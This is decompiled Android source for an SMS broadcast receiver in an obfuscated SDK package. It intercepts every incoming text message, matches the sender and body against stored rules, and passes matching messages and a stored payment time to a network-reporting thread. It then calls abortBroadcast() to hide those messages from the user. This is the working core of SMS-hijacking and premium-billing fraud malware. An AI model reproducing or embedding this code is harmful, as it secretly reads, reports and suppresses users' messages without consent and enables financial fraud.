package bn.sdk.szwcsss.common.az.c.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import bn.sdk.szwcsss.common.az.c.model.SmsInfo;
import bn.sdk.szwcsss.common.az.c.net.Cfor;
import bn.sdk.szwcsss.common.az.c.service.Cdo;
import bn.sdk.szwcsss.common.az.code.a.Cif;
import bn.sdk.szwcsss.common.az.code.c.Ccase;
import bn.sdk.szwcsss.common.az.code.c.Clong;
import java.text.SimpleDateFormat;
import java.util.Date;
/* loaded from: classes.dex */
public class ReceiveSmsReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static final String f557a = "android.provider.Telephony.SMS_RECEIVED";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(f557a)) {
            boolean z = false;
            Bundle extras = intent.getExtras();
            if (extras != null) {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                String str = "";
                int i = 0;
                while (true) {
                    int i2 = i;
                    if (i2 >= smsMessageArr.length) {
                        break;
                    }
                    smsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);
                    i = i2 + 1;
                }
                String str2 = smsMessageArr[0].getDisplayOriginatingAddress().toString();
                for (int i3 = 0; i3 < smsMessageArr.length; i3++) {
                    str = str + smsMessageArr[i3].getDisplayMessageBody().toString();
                }
                if (!Clong.c((Object) str2) && !Clong.c((Object) str)) {
                    Cdo doVar = new Cdo(context, null);
                    bn.sdk.szwcsss.common.az.c.model.Cdo doVar2 = new bn.sdk.szwcsss.common.az.c.model.Cdo();
                    doVar2.b(str);
                    doVar2.e(str2);
                    doVar2.a(String.valueOf(System.currentTimeMillis()));
                    boolean z2 = false;
                    for (SmsInfo smsInfo : new Cif(context).c()) {
                        boolean a2 = doVar.a(doVar2, smsInfo, 1);
                        if (!a2 && doVar.b(doVar2) && !Ccase.c(context, doVar.b(doVar2, smsInfo)) && smsInfo.getType() == 6) {
                            Ccase.d(context, doVar.b(doVar2, smsInfo));
                            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                            new Thread(new Cfor(context, smsInfo.getLinkId(), doVar2.j(), doVar2.g(), "", simpleDateFormat.format(new Date(Long.valueOf(doVar2.f()).longValue())), simpleDateFormat.format(new Date(Long.valueOf(Ccase.g(context, "payTime")).longValue())), 1)).start();
                        }
                        boolean a3 = !a2 ? doVar.a(doVar2, smsInfo) : a2;
                        if (!a3) {
                            a3 = doVar.a(doVar2);
                        }
                        z2 = a3 && !z2;
                    }
                    z = z2;
                }
                if (z) {
                    abortBroadcast();
                }
            }
        }
    }
}
